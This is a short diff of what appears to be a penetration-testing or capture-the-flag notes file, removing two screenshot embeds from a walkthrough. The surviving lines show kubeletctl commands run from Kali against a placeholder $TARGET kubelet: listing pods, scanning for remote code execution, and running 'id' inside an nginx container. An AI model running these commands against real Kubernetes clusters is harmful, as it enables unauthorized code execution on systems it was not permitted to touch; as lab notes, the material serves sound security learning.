@@ -17,11 +17,9 @@ sudo mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
 ```bash - kali
 kubeletctl --server $TARGET pods
 ```
-![[Pasted image 20220217212355.png]]
 ```bash - kali
 kubeletctl --server $TARGET scan rce
 ```
-![[Pasted image 20220217212432.png]]
 ```bash - kali
 kubeletctl --server $TARGET exec "id" -p nginx -c nginx
 ```
